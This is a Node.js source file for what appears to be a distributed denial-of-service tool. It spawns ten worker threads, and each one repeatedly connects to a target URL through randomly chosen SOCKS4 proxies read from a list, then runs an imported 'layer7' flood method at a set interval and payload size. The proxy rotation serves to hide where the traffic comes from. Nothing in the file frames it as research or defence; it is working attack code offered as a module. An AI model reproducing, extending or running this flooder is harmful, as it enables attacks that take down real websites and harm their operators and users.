const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const { SocksClient } = require('socks');
const layer7 = require('./methods/layer7');
const fs = require('fs');

const socks4Proxies = fs.readFileSync('socks4.txt', 'utf8').split('\n').filter(Boolean);

if (!isMainThread) {
    const { targetUrl, delay, kbSize, method } = workerData;
    const target = new URL(targetUrl);

    setInterval(() => {
        const proxy = socks4Proxies[Math.floor(Math.random() * socks4Proxies.length)];
        const [proxyIp, proxyPort] = proxy.split(':');

        if (layer7[method]) {
            const options = {
                proxy: {
                    ipaddress: proxyIp,
                    port: parseInt(proxyPort),
                    type: 4, // SOCKS4
                },
                destination: {
                    host: target.hostname,
                    port: target.port || (target.protocol === 'https:' ? 443 : 80),
                },
                command: 'connect',
                timeout: 5000,
            };

            SocksClient.createConnection(options, (err, info) => {
                if (err) {
                    console.error(`LDS: Failed to connect to ${targetUrl} via ${proxy}`);
                    return;
                }

                if (info && info.socket) {
                    layer7[method](info.socket, target, kbSize);
                } else {
                    console.error(`LDS: Socket not initialized for ${targetUrl}`);
                }
            });
        } else {
            if (layer7[method]) {
                layer7[method](null, target, kbSize);
            } else {
                console.error(`LDS: Method ${method} not found.`);
            }
        }
    }, delay);
}

function start(targetUrl, delay, kbSize, method) {
    const numWorkers = 10; 
    for (let i = 0; i < numWorkers; i++) {
        const worker = new Worker(__filename, {
            workerData: { targetUrl, delay, kbSize, method },
        });

        worker.on('error', (err) => {
            console.error(`LDS: Worker error: ${err.message}`);
        });

        worker.on('exit', (code) => {
            if (code !== 0) {
                console.error(`LDS: Worker stopped with exit code ${code}`);
            }
        });
    }
}

module.exports = { start };
